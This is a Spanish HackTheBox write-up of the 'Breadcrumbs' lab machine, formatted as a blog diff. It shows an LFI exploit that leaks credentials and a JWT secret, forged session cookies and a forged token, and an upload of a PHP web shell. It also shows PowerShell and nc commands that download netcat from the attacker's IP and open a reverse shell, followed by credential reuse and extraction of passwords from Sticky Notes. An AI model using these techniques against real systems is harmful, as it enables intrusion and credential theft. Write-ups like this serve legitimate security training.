+  <li><strong>Proxy</strong> &gt; <strong>Options</strong> &gt; <strong>Match and Replace</strong> &gt; <strong>Add</strong>:</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_proxy_options_addRule_sC.png" alt="316burp_proxy_options_addRule_sC" /></p>
+
+<p>Y ya no tendríamos que estar modificando la petición en <code>Burp</code>.</p>
+
+<p>…</p>
+
+<p>Jugando con <code>Burp</code> caí en cuenta de algo, al iniciar sesión se nos genera una <code>Cookie</code> con el siguiente formato:</p>
+
+<pre><code class="language-php">Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJKYXRhIjp7InVzZXJuYW1lIjoibGFueiJ9fQ.liQqzYVpD3qq_0y70ft7fHPwBFknX1Hd2Naxp7Ioubo;
+PHPSESSID=lanz23ccbc5fab78e561862271461cc6bedc
+</code></pre>
+
+<p>O sea:</p>
+
+<pre><code class="language-php">Cookie: token=BLABLABLA; PHPSESSID=usernameBLABLABLA
+</code></pre>
+
+<p>Podemos probar varias cosas, como incrementar el tamaño de nuestro <code>username</code>, cambiar el contenido del <code>PHPSESSID</code>, agregar números o incluso caracteres especiales y ver si nos responde algo inusual…</p>
+
+<p>Pues despues de probar algunas de ellas, si agregamos el símbolo <code>#</code> en la variable <code>PHPSESSID</code> nos responde:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_phpsessid_with_symbol.png" alt="316burp_phpsessid_with_symbol" /></p>
+
+<p>Opa, vemos la ruta donde esta el servidor y además un usuario (<code>www-data</code>).</p>
+
+<blockquote>
+  <p>También para tenerlo en cuenta…</p>
+</blockquote>
+
+<p>En este punto me estanqué, asi que volví atrás para ver que tenía y que no había revisado bien (y pues bien hecho).</p>
+
+<p>Volviendo al apartado donde buscamos libros por su título y autor, si nos enfocamos en el código que hace todo el proceso, nos damos cuenta de algo interesante:</p>
+
+<blockquote>
+  <p>Les pongo el codigo pa ver si ven el error antes de explicarlo :P</p>
+</blockquote>
+
+<pre><code class="language-js">http://10.10.10.228/js/books.js
+</code></pre>
+
+<pre><code class="language-js">$(document).ready(function(){
+    var book = null;
+    $("#note").click(function(){
+        $("#tableBody").html("");
+        const title = $("#title").val();
+        const author = $("#author").val();
+        if(title == "" &amp;&amp; author == ""){
+            $("#message").html("Nothing found :(");
+        }
+        else{
+            searchBooks(title, author);
+        }
+    })
+
+    $("#interested").click(function(){
+
+    });
+});
+
+function getInfo(e){
+    const bookId = "book" + $(e).closest('tr').attr('id') + ".html";
+    jQuery.ajax({
+        url: "../includes/bookController.php",
+        type: "POST",
+        data: {
+            book: bookId,
+            method: 1,
+        },
+        dataType: "json",
+        success: function(res){
+            $("#about").html(res);
+        }
+    });
+}
+
+function modal(){
+    return '&lt;button type="button" onclick="getInfo(this)" class="btn btn-outline-warning" data-toggle="modal" data-target="#actionModal"&gt;Book&lt;/button&gt;';
+}
+
+function searchBooks(title, author){
+    jQuery.ajax({
+        url: "../includes/bookController.php",
+        type: "POST",
+        data: {
+            title: title,
+            author: author,
+            method: 0,
+        },
+        dataType: "json",
+        success: function(res){
+            if(res.length == 0 || res == false){
+                $("#message").html("Nothing found :(");
+            }
+            else{
+                let ret = "";
+                for(book in res){
+                    $("#message").html("");
+                    ret += "&lt;tr id='" + res[book].id + "'&gt;";
+                    ret += "&lt;td&gt;"+res[book].title+"&lt;/td&gt;";
+                    ret += "&lt;td&gt;"+res[book].author+"&lt;/td&gt;";
+                    ret += "&lt;td&gt;" + modal() + "&lt;/td&gt;";
+                    ret += "&lt;/tr&gt;";
+                    $("#tableBody").html(ret)
+                }
+            }
+        }
+    });
+}
+</code></pre>
+
+<p>Si validamos todo el recorrido que hace (comparándolo con el <code>HTML</code> del cual extrae los <code>IDs</code>) tendríamos resumidamente algo asi:</p>
+
+<ul>
+  <li>Cuando se genere un clic en el botón Search (ID <code>note</code>) guarda la info de los dos campos y si alguno de los dos tiene contenido se va para la función <code>searchBooks()</code>.</li>
+  <li>Aquí simplemente hace la búsqueda por medio de <code>AJAX</code> y si encuentra resultados los muestra, por ahora nada relevante.</li>
+  <li>Cuando nos muestra todos los libros encontrados, en pantalla tenemos más opciones:</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_php_booksPHP_searchTitle_a.png" alt="316page80_php_booksPHP_searchTitle_a" /></p>
+
+<ul>
+  <li>Si volvemos al <code>codigo</code> y buscamos el llamado al botón <code>Book</code>, vemos que se genera cada uno de ellos en la respuesta anterior, esta siendo llamada por la función <code>modal()</code> y su contenido:</li>
+</ul>
+
+<pre><code class="language-js">...
+function modal(){
+    return '&lt;button type="button" onclick="getInfo(this)" class="btn btn-outline-warning" data-toggle="modal" data-target="#actionModal"&gt;Book&lt;/button&gt;';
+...
+</code></pre>
+
+<ul>
+  <li>Cuando se da clic nos lleva a la función <code>getInfo()</code> y acá es donde esta el jugueteo:</li>
+</ul>
+
+<pre><code class="language-js">...
+function getInfo(e){
+    const bookId = "book" + $(e).closest('tr').attr('id') + ".html";
+    jQuery.ajax({
+        url: "../includes/bookController.php",
+        type: "POST",
+        data: {
+            book: bookId,
+            method: 1,
+        },
+...
+</code></pre>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>Que tenemos…</p>
+
+<ul>
+  <li>Vemos que genera una cadena de texto extrayendo el ID que despues buscara como <code>bookId</code> en el archivo <code>bookController.php</code>.</li>
+  <li>Simulando la cadena tendríamos algo asi:
+    <ul>
+      <li><code>book2.html</code> (<strong>2</strong> o cualquier numero).</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Esto ya llama la atención porque podemos pensar que esta llamando archivos <code>.html</code> del sistema, o sea que podemos probar algún tipo de <code>LFI</code> (Local File Inclusion) o <code>RFI</code> (Remote File Inclusión).</p>
+
+<p>Interceptemos con <code>Burp</code> y juguemos…</p>
+
+<blockquote>
+  <p>Local File Inclusion: Ver archivos del sistema a lso cuales normalemten no tendriamos acceso.
+Remote File Inclusion: Ver archivos remotos (externos) desde el sistema local. (Lo cual es muuuuuuuuucho más peligroso)</p>
+</blockquote>
+
+<ul>
+  <li><a href="https://www.cyberseguridad.net/inclusion-de-ficheros-remotos-rfi-remote-file-inclusion-ataques-informaticos-ii">Inclusión de archivos</a>.</li>
+  <li><a href="https://www.welivesecurity.com/la-es/2015/01/12/como-funciona-vulnerabilidad-local-file-inclusion/">Como funciona un <strong>Local File Inclusion</strong></a>.</li>
+</ul>
+
+<p>La petición normal sería esta:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_searchDescBook_normal.png" alt="316burp_searchDescBook_normal" /></p>
+
+<p>Ahora modificando el contenido podríamos probar a encontrar inicialmente el archivo <code>bookController.php</code> para ver que tan lejos estamos del directorio <code>/htdocs</code> y centrarnos…</p>
+
+<blockquote>
+  <p>El propio output al poner una ruta equivocada nos indica donde estamos, <strong>pero no me acordaba</strong>.</p>
+</blockquote>
+
+<p>Probando <code>../includes...</code> tenemos el output del archivo:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_searchDescBook_LFI_bookC.png" alt="316burp_searchDescBook_LFI_bookC" /></p>
+
+<p>Un poco horrible el output :P, pero bueno, al menos confirmamos una inclusión local de archivos (<strong>LFI</strong>).</p>
+
+<p>Viendo su contenido me acordé del archivo <code>db.php</code>, si vemos su contenido y lo intentamos hacer más bonito tenemos:</p>
+
+<pre><code class="language-php">book=../db/db.php&amp;method=1
+</code></pre>
+
+<pre><code class="language-php">&lt;?php
+
+$host = "localhost";
+$port=3306;
+$user="bread";
+$password="jUli901";
+$dbname="bread";
+
+$con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());
+
+?&gt;
+</code></pre>
+
+<p>Nice, tenemos las credenciales de la base de datos de lo que parece ser el usuario <code>juliette</code> (si dice “bread” pero la password dice otra cosa :P)… Intentando rehusar esas contraseñas contra el servicio <code>SSH</code> y <code>mysql</code> no logramos nada. Sigamos jugando con el <code>LFI</code>…</p>
+
+<p><strong>(Les dejo el contenido del archivo vulnerable para que le echen un ojo al problema:</strong></p>
+
+<pre><code class="language-php">&lt;?php
+
+if($_SERVER['REQUEST_METHOD'] == "POST"){
+    $out = "";
+    require '../db/db.php';
+    $title = "";
+    $author = "";
+    if($_POST['method'] == 0){
+        if($_POST['title'] != ""){
+            $title = "%".$_POST['title']."%";
+        }
+        if($_POST['author'] != ""){
+            $author = "%".$_POST['author']."%";
+        }
+        $query = "SELECT * FROM books WHERE title LIKE ? OR author LIKE ?";
+        $stmt = $con-&gt;prepare($query);
+        $stmt-&gt;bind_param('ss', $title, $author);
+        $stmt-&gt;execute();
+        $res = $stmt-&gt;get_result();
+        $out = mysqli_fetch_all($res,MYSQLI_ASSOC);
+    }
+    elseif($_POST['method'] == 1){
+        $out = file_get_contents('../books/'.$_POST['book']);
+    }
+    else{
+        $out = false;
+    }
+    echo json_encode($out);
+}
+</code></pre>
+
+<p><strong>e.e)</strong></p>
+
+<p>Si recordamos teniamos un archivo para subir objetos <code>.zip</code>, veamos su estructura:</p>
+
+<pre><code class="language-php">book=../portal/php/files.php&amp;method=1
+</code></pre>
+
+<pre><code class="language-php">&lt;?php 
+
+session_start();
+$LOGGED_IN = false;
+if($_SESSION['username'] !== "paul"){
+    header("Location: ../index.php");
+}
+if(isset($_SESSION['loggedIn'])){
+    $LOGGED_IN = true;
+    require '../db/db.php';
+}
+else{
+    header("Location: ../auth/login.php");
+    die();
+}
+
+?&gt;
+
+&lt;html lang="en"&gt;
+&lt;head&gt;
+    &lt;title&gt;Binary&lt;/title&gt;
+    ...
+...
+</code></pre>
+
+<p>La razón por la que no podemos entrar es porque <strong>no es <code>paul</code> el que hace la petición</strong> :O</p>
+
+<p>Despues de dar algunas vueltas entre archivos buscando cositas, encontré una cadena interesante que quizás nos pueda servir despues (<code>secret_key</code>):</p>
+
+<pre><code class="language-php">book=../portal/authController.php&amp;method=1
+</code></pre>
+
+<pre><code class="language-php">...
+$secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
+...
+</code></pre>
+
+<p>Y encontramos como se genera la <code>cookie</code> de sesión:</p>
+
+<pre><code class="language-php">book=../portal/cookie.php&amp;method=1
+</code></pre>
+
+<pre><code class="language-php">&lt;?php
+/**
+* @param string $username  Username requesting session cookie
+* * @return string $session_cookie Returns the generated cookie
+* * @devteam
+* * Please DO NOT use default PHPSESSID; our security team says they are predictable.
+* * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
+**/
+
+function makesession($username){
+    $max = strlen($username) - 1;
+    $seed = rand(0, $max);
+    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
+    $session_cookie = $username.md5($key);
+    return $session_cookie;
+    
+}
+</code></pre>
+
+<p>Jugando con <a href="https://paiza.io/es/projects/new">un ejecutador de código online</a> de <code>PHP</code> podemos entender mejor que hace:</p>
+
+<pre><code class="language-php">&lt;?php
+    $username = "lanz";
+    echo "Username: $username\n";
+    
+    //Toma el tamaño del username y le quita 1 (lanz (4)-1=3)
+    $max = strlen($username) - 1;  
+    echo "Max: $max\n";
+    
+    //Toma un numero (en este caso) entre 0 y 3 (0,1,2,3)
+    $seed = rand(0, $max);   
+    echo "Seed: $seed\n";
+    
+    //Con el numero anterior extrae un caracter del username y lo junta con dos cadenas
+    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";  
+    echo "Key: $key\n";
+    
+    //Pasa el valor de la cadena a md5 e imprime el username+md5
+    $session_cookie = $username.md5($key);   
+    //return $session_cookie;
+    echo $session_cookie;
+?&gt;
+</code></pre>
+
+<p>Y si ejecutamos:</p>
+
+<pre><code class="language-html">Username: lanz
+Max: 3
+Seed: 3
+Key: s4lTy_stR1nG_z(!528./9890
+lanz23ccbc5fab73e561862271461cc6bedc
+</code></pre>
+
+<p>De esto podemos concluir que al final solo se nos pueden generar 4 tipos de <code>cookie</code>, ya que lo único que varía es el carácter y como nuestro nombre es de 4 pues solo pueden ser <strong>4</strong> 😇</p>
+
+<p>Ahora, teniendo en cuenta esto, podemos iterar sobre el usuario <strong>lanz</strong> y ver que <code>cookies</code> se le generan y ver si alguna coincide con la que tenemos actualmente.</p>
+
+<p>Démosle:</p>
+
+<pre><code class="language-php">&lt;?php
+    $username = "lanz";
+    echo "Username: $username\n";
+    
+    #Toma el tamaño del username y le quita 1 (lanz (4)-1=3)
+    $max = strlen($username) - 1;  
+    echo "Max: $max\n\n";
+    
+    #Toma un numero (en este caso) entre 0 y 3 (0,1,2,3)
+    //$seed = rand(0, $max);   
+
+    for ($seed = 0; $seed &lt; 4; $seed++) {
+        echo "Seed: $seed\n";
+        echo "Letra: $username[$seed]\n";
+    
+        #Con el numero anterior extrae un caracter del user name y lo junta con dos cadenas
+        $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";  
+        echo "Key: $key\n";
+    
+        #Pasa el valor de la cadena a md5 e imprime el username+md5
+        $session_cookie = $username.md5($key);   
+        //return $session_cookie;
+        echo $session_cookie."\n\n";
+    }
+?&gt;
+</code></pre>
+
+<p>Y su resultado:</p>
+
+<pre><code class="language-html">Username: lanz
+Max: 3
+
+Seed: 0
+Letra: l
+Key: s4lTy_stR1nG_l(!528./9890
+lanz47200b180ccd6835d25d034eeb6e6390
+
+Seed: 1
+Letra: a
+Key: s4lTy_stR1nG_a(!528./9890
+lanz61ff9d4aaefe6bdf45681678ba89ff9d
+
+Seed: 2
+Letra: n
+Key: s4lTy_stR1nG_n(!528./9890
+lanze640846cb7f7acdbe36b4f006d12fb3e
+
+Seed: 3
+Letra: z
+Key: s4lTy_stR1nG_z(!528./9890
+lanz23ccbc5fab73e561862271461cc6bedc
+</code></pre>
+
+<p><strong>(Y si, una de las <code>cookies</code> que se genera, es la que tenemos actualmente en nuestra sesión)</strong></p>
+
+<p>Ahora, hagamos lo mismo pero con <code>paul</code>:</p>
+
+<blockquote>
+  <p><a href="https://paiza.io/projects/5iqJvM3BOwOFtZb0clK0Og">https://paiza.io/projects/5iqJvM3BOwOFtZb0clK0Og</a>.</p>
+</blockquote>
+
+<pre><code class="language-php">&lt;?php
+    $username = "paul";
+...
+</code></pre>
+
+<pre><code class="language-html">Username: paul
+Max: 3
+
+Seed: 0
+Letra: p
+Key: s4lTy_stR1nG_p(!528./9890
+paula2a6a014d3bee04d7df8d5837d62e8c5
+
+Seed: 1
+Letra: a
+Key: s4lTy_stR1nG_a(!528./9890
+paul61ff9d4aaefe6bdf45681678ba89ff9d
+
+Seed: 2
+Letra: u
+Key: s4lTy_stR1nG_u(!528./9890
+paul8c8808867b53c49777fe5559164708c3
+
+Seed: 3
+Letra: l
+Key: s4lTy_stR1nG_l(!528./9890
+paul47200b180ccd6835d25d034eeb6e6390
+</code></pre>
+
+<p>Si probamos con un editor de cookie, logramos robarle la sesión a <strong>paul</strong> con la última generada:</p>
+
+<pre><code class="language-html">Seed: 3
+Letra: l
+Key: s4lTy_stR1nG_l(!528./9890
+paul47200b180ccd6835d25d034eeb6e6390
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_editCookie_paul_done.png" alt="316page80_editCookie_paul_done" /></p>
+
+<p>Ya podemos navegar tranquilamente sobre el recurso <code>/files.php</code>, pero hay un problema aún, ya que el otro <code>cookie</code> (<code>token</code>) tiene contenido de <code>lanz</code> y no de <code>paul</code> asi que no podemos subir nada aún:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_err_up_zipF_x_tokenErr.png" alt="316burp_err_up_zipF_x_tokenErr" /></p>
+
+<p>Si borramos la cookie <code>token</code> obtenemos este error:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_err_up_zipF_x_tokenErr.png" alt="316page80_err_up_zipF_x_tokenErr" /></p>
+
+<pre><code class="language-php">book=../portal/includes/fileController.php&amp;method=1
+</code></pre>
+
+<pre><code class="language-php">&lt;?php
+
+$ret = "";
+require "../vendor/autoload.php";
+use \Firebase\JWT\JWT;
+session_start();
+function validate(){    
+    $ret = false;  
+    $jwt = $_COOKIE['token'];    
+    $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e'; 
+    $ret = JWT::decode($jwt, $secret_key, array('HS256')); 
+    return $ret;
+}
+if($_SERVER['REQUEST_METHOD'] === "POST"){
+    $admins = array("paul");
+    $user = validate()-&gt;data-&gt;username; 
+    if(in_array($user, $admins) &amp;&amp; $_SESSION['username'] == "paul"){
+        error_reporting(E_ALL &amp; ~E_NOTICE);
+        $uploads_dir = '../uploads';
+        $tmp_name = $_FILES["file"]["tmp_name"];
+        $name = $_POST['task'];
+        if(move_uploaded_file($tmp_name, "$uploads_dir/$name")){
+            $ret = "Success. Have a great weekend!";
+        }
+        else{
+        $ret = "Missing file or title :(" ;      
+        }
+    }
+    else{
+    $ret = "Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.";
+    }
+    echo $ret;
+}
+</code></pre>
+
+<p>Vemos el proceso por el que pasa el archivo que subamos (no hay validación de nada :O) y la carpeta en la que queda guardado: <code>/uploads</code>.</p>
+
+<ul>
+  <li><a href="https://habr.com/en/post/450054/">Siguiendo este post, podemos ver que hay detrás de la cadena <strong>token</strong></a>.</li>
+</ul>
+
+<p>Usando <a href="https://jwt.io/">esta web</a> también vemos como esta conformado el <code>token</code> y asi mismo podemos modificarla para generar la de <code>paul</code>:</p>
+
+<ul>
+  <li><a href="https://knowledgecenter.2checkout.com/Documentation/07Commerce/2Checkout-ConvertPlus/How-to-generate-a-JSON-Web-Token-JWT">Guia para generar nuevos tokens apoyado en el <strong>secret key</strong> (que encontramos antes)</a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316google_genToken_decodelanzTK.png" alt="316google_genToken_decodelanzTK" /></p>
+
+<p>Siguiendo la guía, ahora simplemente modificaríamos el username por <code>paul</code> y pondríamos en ese cuadro la <code>secret key</code>, generaríamos e intentaríamos de nuevo subir el archivo <code>.zip</code></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316google_genToken_paulTK.png" alt="316google_genToken_paulTK" /></p>
+
+<p>Validamos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_done_up_zipF_paul.png" alt="316burp_done_up_zipF_paul" /></p>
+
+<p>Perfecto, ahora sí, modifiquemos con el editor de cookies la variable <code>token</code> y validemos desde la web:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_done_up_zipF_paul.png" alt="316page80_done_up_zipF_paul" /></p>
+
+<p>Si jugamos con <code>burp</code> para modificar el nombre con el que viaja logramos subir un archivo <code>.php</code> con contenido <code>PHP</code>:</p>
+
+<p>Original sin modificar:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_err_up_phpF.png" alt="316burp_err_up_phpF" /></p>
+
+<p>Spoiler: <strong>Ignoren el <code>PHP</code>, no puedo borrarlo :P</strong></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_done_up_zipF_paul.png" alt="316page80_err_up_phpF" /></p>
+
+<p>Se subió como <code>holi.zip</code>, simplemente en <code>Burp</code> le cambiamos la extensión:</p>
+
+<pre><code class="language-html">...
+&lt;?php
+
+echo "Hola";
+
+?&gt;
+
+-----------------------------1138605338005785511225757143
+Content-Disposition: form-data; name="task"
+
+holi.php
+...
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_done_up_phpF.png" alt="316page80_done_up_phpF" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_phpF_holi.png" alt="316page80_phpF_holi" /></p>
+
+<p>Perfecto, ya con esto podemos conseguir ejecucion de comandos en el sistema, hagámoslo para lanzarnos una Reverse Shell…</p>
+
+<pre><code class="language-php">...
+Content-Type: application/x-php
+
+&lt;?php
+    $coma=shell_exec($_GET['xmd']); echo $coma;
+?&gt;
+
+
+-----------------------------1138605338005785511225757143
+...
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_phpF_holi_RCE.png" alt="316page80_phpF_holi_RCE" /></p>
+
+<p>Enumerando podemos escribir en el directorio:</p>
+
+<pre><code class="language-powershell">C:\Users\www-data\Desktop\\xampp\tmp
+</code></pre>
+
+<p>Aprovechemos esto para subir el binario <code>nc</code> para posteriormente lanzarnos una petición hacia nuestro listener y obtener una Shell:</p>
+
+<p>Nos ponemos en escucha donde tengamos el binario y ejecutamos:</p>
+
+<pre><code class="language-html">?xmd=powershell -c "IWR -uri http://10.10.14.194:8000/nc64.exe -OutFile C:\\Users\\www-data\\Desktop\\xampp\\tmp\\nc.exe"
+</code></pre>
+
+<p>Validamos:</p>
+
+<pre><code class="language-html">?xmd=dir C:\Users\www-data\Desktop\\xampp\tmp\
+</code></pre>
+
+<pre><code class="language-powershell"> Volume in drive C has no label.
+ Volume Serial Number is 7C07-CD3A
+
+ Directory of C:\Users\www-data\Desktop\\xampp\tmp
+
+03/12/2021  12:55 PM    &lt;DIR&gt;          .
+03/12/2021  12:55 PM    &lt;DIR&gt;          ..
+03/12/2021  12:47 PM                12 holas.txt
+03/12/2021  12:55 PM            45,272 nc.exe
+03/12/2021  12:53 PM                 0 sess_04f3tvcgqt3lcuabhihd56tbdv
+...
+</code></pre>
+
+<p>Perfecto, ahora nos ponemos es escucha con <code>nc</code> y ejecutamos:</p>
+
+<pre><code class="language-html">?xmd=C:\Users\www-data\Desktop\\xampp\tmp\nc.exe 10.10.14.194 4433 -e cmd.exe
+</code></pre>
+
+<p>Yyyy:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_revSH_wwwdata.png" alt="316bash_revSH_wwwdata" /></p>
+
+<p>Tamos dentroooooooooooooooeoeoeowowoewoeowirjaksdfj (: Ahora a enumerar…</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/breadcrumbs/RCE_uploadPHPfile.py">Script que nos permite ejecutar comandos automatizando todo lo anterior</a>.</p>
+</blockquote>
+
+<p>…</p>
+
+<h2 id="movimiento-lateral-juliette">Movimiento lateral www-data -&gt; juliette <a href="#movimiento-lateral-juliette">#</a></h2>
+
+<p>Dándole un vistazo a los archivos que hay en la ruta <code>/portal</code> encontramos una carpeta llamativa sobre pizza :P</p>
+
+<pre><code class="language-powershell">PS C:\Users\www-data\Desktop\\xampp\htdocs\portal&gt; dir
+...
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          2/8/2021   5:37 AM                assets
+d-----          2/8/2021   5:37 AM                db
+d-----          2/8/2021   5:37 AM                includes
+d-----          2/8/2021   5:37 AM                php
+d-----          2/8/2021   5:37 AM                pizzaDeliveryUserData
+d-----         3/12/2021   4:46 PM                uploads
+d-----          2/8/2021   5:37 AM                vendor
+-a----          2/1/2021  10:40 PM           3956 authController.php
+-a----          2/1/2021   9:40 PM            114 composer.json
+-a----        11/28/2020  12:55 AM           6140 composer.lock
+-a----         12/9/2020   3:30 PM            534 cookie.php
+-a----          2/1/2021   6:59 AM           3757 index.php
+-a----          2/1/2021   1:57 AM           2707 login.php
+-a----         1/16/2021   1:47 PM            694 logout.php
+-a----          2/1/2021   1:58 AM           2934 signup.php
+</code></pre>
+
+<p>Pues si entramos:</p>
+
+<pre><code class="language-powershell">PS C:\Users\www-data\Desktop\\xampp\htdocs\portal\pizzaDeliveryUserData&gt; dir
+...
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        11/28/2020   1:48 AM            170 alex.disabled
+-a----        11/28/2020   1:48 AM            170 emma.disabled
+-a----        11/28/2020   1:48 AM            170 jack.disabled
+-a----        11/28/2020   1:48 AM            170 john.disabled
+-a----         1/17/2021   3:11 PM            192 juliette.json
+-a----        11/28/2020   1:48 AM            170 lucas.disabled
+-a----        11/28/2020   1:48 AM            170 olivia.disabled
+-a----        11/28/2020   1:48 AM            170 paul.disabled
+-a----        11/28/2020   1:48 AM            170 sirine.disabled
+-a----        11/28/2020   1:48 AM            170 william.disabled
+</code></pre>
+
+<p>Y claramente vemos algo diferente (además de ser algo de <code>juliette</code>, que desde el inicio nos llamó la atención), <code>juliette.json</code>:</p>
+
+<pre><code class="language-powershell">PS C:\Users\www-data\Desktop\\xampp\htdocs\portal\pizzaDeliveryUserData&gt; type juliette.json
+</code></pre>
+
+<pre><code class="language-json">{
+        "pizza" : "margherita",
+        "size" : "large",
+        "drink" : "water",
+        "card" : "VISA",
+        "PIN" : "9890",
+        "alternate" : {
+                "username" : "juliette",
+                "password" : "jUli901./())!",
+        }
+}
+</code></pre>
+
+<p>Tenemos nuevas credenciales, al parecer de un servicio de pizza, en el que <code>juliette</code> le da igual poner sus credenciales porque simplemente son del portal de pizza, no? Salgamos de la duda…</p>
+
+<p>Usando <code>SSH</code> hacia la máquina:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_SSH_juliette_done.png" alt="316bash_SSH_juliette_done" /></p>
+
+<p>Perfecto, haciendo reutilización de credenciales logramos obtener una sesión como <code>juliette</code> dentro del sistema (: con ella tenemos la flag del usuario…</p>
+
+<p>…</p>
+
+<h2 id="movimiento-lateral-dev">Movimiento lateral juliette &gt; development <a href="#movimiento-lateral-dev">#</a></h2>
+
+<p>Tenemos un archivo con tareas que <code>juliette</code> tiene planteado hacer:</p>
+
+<pre><code class="language-powershell">PS C:\Users\juliette\Desktop&gt; type .\todo.html
+&lt;html&gt;
+&lt;style&gt;
+html{
+background:black;
+color:orange;
+}
+table,th,td{
+border:1px solid orange;
+padding:1em;
+border-collapse:collapse;
+}
+&lt;/style&gt;
+&lt;table&gt;
+        &lt;tr&gt;
+            &lt;th&gt;Task&lt;/th&gt;
+            &lt;th&gt;Status&lt;/th&gt;
+            &lt;th&gt;Reason&lt;/th&gt;
+        &lt;/tr&gt;
+        &lt;tr&gt;
+            &lt;td&gt;Configure firewall for port 22 and 445&lt;/td&gt;
+            &lt;td&gt;Not started&lt;/td&gt;
+            &lt;td&gt;Unauthorized access might be possible&lt;/td&gt;
+        &lt;/tr&gt;
+        &lt;tr&gt;
+            &lt;td&gt;Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager&lt;/td&gt;
+            &lt;td&gt;In progress&lt;/td&gt;
+            &lt;td&gt;It stores passwords in plain text&lt;/td&gt;
+        &lt;/tr&gt;
+        &lt;tr&gt;
+            &lt;td&gt;Add new features to password manager&lt;/td&gt;
+            &lt;td&gt;Not started&lt;/td&gt;
+            &lt;td&gt;To get promoted, hopefully lol&lt;/td&gt;
+        &lt;/tr&gt;
+&lt;/table&gt;
+
+&lt;/html&gt;
+</code></pre>
+
+<p>Si nos fijamos en la segunda tarea, habla sobre el software <a href="https://en.wikipedia.org/wiki/Sticky_Notes">Microsoft Store Sticky Notes</a> (app para tomar notas en el escritorio), que al parecer guarda las contraseñas en texto plano…</p>
+
+<p>Con esto en la cabeza y buscando en internet cuál es el directorio donde se guardan, encontramos este recurso:</p>
+
+<ul>
+  <li><a href="https://www.techrepublic.com/article/how-to-backup-and-restore-sticky-notes-in-windows-10/">How to back up and restore <strong>Sticky Notes</strong> in <strong>Windows 10</strong></a>.</li>
+  <li>Acá también lo reseñan, <a href="https://www.howtogeek.com/283472/how-to-back-up-and-restore-sticky-notes-in-windows/">How to Back Up and Restore Sticky Notes in Windows</a>.</li>
+</ul>
+
+<p>Donde nos habla que en la ruta:</p>
+
+<pre><code class="language-powershell">C:\Users\Username\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState  
+</code></pre>
+
+<p>Se encuentran archivos relacionados con <code>Sticky Notes</code> y si, validando encontramos la ruta:</p>
+
+<pre><code class="language-powershell">PS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState&gt; ls -force
+
+    Directory: C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         1/15/2021   4:10 PM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
+-a----        11/29/2020   3:10 AM           4096 plum.sqlite
+-a----         1/15/2021   4:10 PM          32768 plum.sqlite-shm
+-a----         1/15/2021   4:10 PM         329632 plum.sqlite-wal
+</code></pre>
+
+<p>Si leemos el archivo <code>plum.sqlite-wal</code> vemos algún tipo de traza:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_SSH_juliette_sticky_found_PWs.png" alt="316bash_SSH_juliette_sticky_found_PWs" /></p>
+
+<p>Claramente vemos la contraseña de <code>juliette</code> y lo que parece ser otra contraseña de un usuario llamado <code>development</code>, si hacemos una validación rápida de los usuarios tenemos:</p>
+
